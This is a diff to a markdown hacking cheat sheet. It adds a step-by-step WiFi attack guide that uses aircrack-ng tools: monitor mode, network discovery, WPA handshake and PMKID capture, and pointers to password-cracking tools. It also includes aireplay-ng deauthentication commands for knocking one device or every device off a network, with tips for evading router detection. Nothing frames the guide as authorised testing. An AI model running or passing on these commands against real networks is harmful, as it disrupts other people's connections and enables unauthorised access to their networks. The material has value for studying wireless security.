@@ -757,7 +757,7 @@ samdump2 -o hashes.txt SYSTEM SAM
 
 The hashes you will get will be in this format:
 
-> {USER}:{USER_ID}:LM_HASH:NT_HASH:::
+> {USER}:{USER_ID}:{LM_HASH}:{NT_HASH}:::
 
 For example:
 
@@ -797,3 +797,155 @@ iwconfig
 
 ![Wlan Interfaces Image](/img/Wlan%20Interfaces.png)
 
+You should have at least one interface, named like wlan0 or wlan1.
+
+In the next step if you use the interface that is connected to the internet you will **lose your internet connection until you restart the computer**, so if you only have 1 wlan interface you will need an ethernet cable to have connection to the internet.
+
+To start searching for networks using your interface:
+
+```console
+sudo airmon-ng start {WLAN_INTERFACE_NAME}
+```
+
+For example:
+
+```console
+sudo airmon-ng start wlan0
+```
+
+If you see a message that says "Found processes that could cause trouble," run this to kill them:
+
+```console
+sudo airmon-ng check kill
+```
+
+Now if you run this command again it should show that the interface mode is now at Monitor mode and not in Managed mode
+
+```console
+iwconfig
+```
+
+![Wlan Managed Mode Image](/img/Wlan%20managed%20mode.png)
+
+#### Discovering networks in your area
+
+To discover 2.4G networks near you use this command (note that the Wlan interface name should have changed after the activation of the Monitor mode)
+
+```console
+sudo airodump-ng {WLAN_INTERFACE_MONITOR_NAME}
+```
+
+For example:
+
+```console
+sudo airodump-ng wlan0mon
+```
+
+To discover all networks including 5G near you use this command
+
+```console
+sudo airodump-ng --band ab {WLAN_INTERFACE_MONITOR_NAME}
+```
+
+For example:
+
+```console
+sudo airodump-ng --band ab wlan0mon
+```
+
+The disadvantage of discovering all networks instead the default ones is that your machine looks in more than 170 channels instead of 15 and this takes a lot more time to refresh th same network again.
+
+Note that to get handshakes through 5G you will need to really be near the router.
+
+#### Focusing on one network
+
+Now that you have seen the networks in your area you need to choose one and get its BSSID and CH (channel).
+
+Note that networks with lower values of PWR (power) means that the network is too far away and that lowers the possibilities to get a Handshake, try to pick the nearest network to -1 PWR or try walking near the router (the PWR value will increase).
+
+In my experience the minimum power that i could get a handshake was -60 PWR and took over 2 days.
+
+This command focus on a network, the -c (channel) is not mandatory neither --output-format but it helps on what we are trying to do:
+
+```console
+sudo airodump-ng -c {CHANNEL_NUM} -w {FILE_NAME} --output-format pcap -d {NETWORK_BSSID} {WLAN_INTERFACE_MONITOR_NAME}
+```
+
+For example:
+
+```console
+sudo airodump-ng -c 6 -w cap --output-format pcap -d 98:7E:CA:AE:A9:DF wlan0mon
+```
+
+This command is the same in 2.4G and 5G networks, just watch that the same network has different BSSIDs for 2.4G and 5G.
+
+![Capturing Handshake Image](/img/Capturing%20Handshake.png)
+
+After running this command you should see something like this, the first part (1) show infos about the network that we are focusing, if no infos appear it means that either the network is off or the channel is wrong. A bug that i noticed is that the infos about some networks disappear after some time, the way that i supressed this was to not set an especific channel to focus.
+
+The second part (2) show devices that are connected to the network, to capture a handshake either a new device (that has the password) can connect to the network or a connected device can disconnect and connect again.
+
+You can passively wait for the handshake or you can try to disconnect devices from the network to capture the handshakes when they connect again, but this is risky because you can be detected by others doing it.
+
+Also a lot of routers have security measures against deauthentication attacks nowadays.
+
+[How to do a Deauth attack](#deauth-attack)
+
+![Handshake Captured Image](/img/Handshake%20Captured.png)
+
+After capturing the handshake something like this (1) should appear in the terminal.
+
+If appear a PMKID instead of a Handshake it means that you are lucky because even without any users connecting to the network the Aircrack managed to get a PMKID that can be used to crack the password without the need of a handshake, in this case you need to extract the PMKID from the .cap file using hcxtool:
+
+```console
+hcxpcaptool -z {FILE_TO_SAVE_HASH_FROM_PMKID} {CAP_FILE}
+```
+
+For example:
+
+```console
+hcxpcaptool -z pmkid_hash.txt cap.cap
+```
+
+#### Cracking the password from the Handshake/PMKID
+
+These tools can help you to crack Handshakes or PMKIDs:
+
+- [Online Hash Cracking](#websites-for-crashing-hashs)
+
+- [John the Ripper](#john-the-ripper)
+
+- [Hashcat](#hashcat)
+
+
+## Deauth Attack
+
+The deauthentication attack tries to disconnect a user or all the users of a network, but it can be detected and a lot of routers have security measures against this kind of attack nowadays.
+
+To try to hide your presence and not be detected by the security mecanisms the best is to set a number of tries (leaving in at 0 tries infinite times) and try to attack only one device at time. 
+
+#### Disconecting a device
+
+Note that the device BSSID can be found when [focusing on a network with airdump](#focusing-on-one-network), below "STATION" column.
+
+```console
+sudo aireplay-ng -0 {NUMBER OF TRIES} -a {NETWORK_BSSID} -c {DEVICE_BSSID} {WLAN_INTERFACE_MONITOR_NAME}
+```
+
+For example:
+
+```console
+sudo aireplay-ng -0 20 -a 86:7E:CA:AE:A9:DE -c D4:F4:6F:C6:BE:2B wlan0mon
+```
+
+#### Disconecting all devices
+
+```console
+sudo aireplay-ng -0 {NUMBER OF TRIES} -a {NETWORK_BSSID} {WLAN_INTERFACE_MONITOR_NAME}
+```
+
+For example:
+
+```console
+sudo aireplay-ng -0 0 -a 86:7E:CA:AE:A9:DE wlan0mon
+```
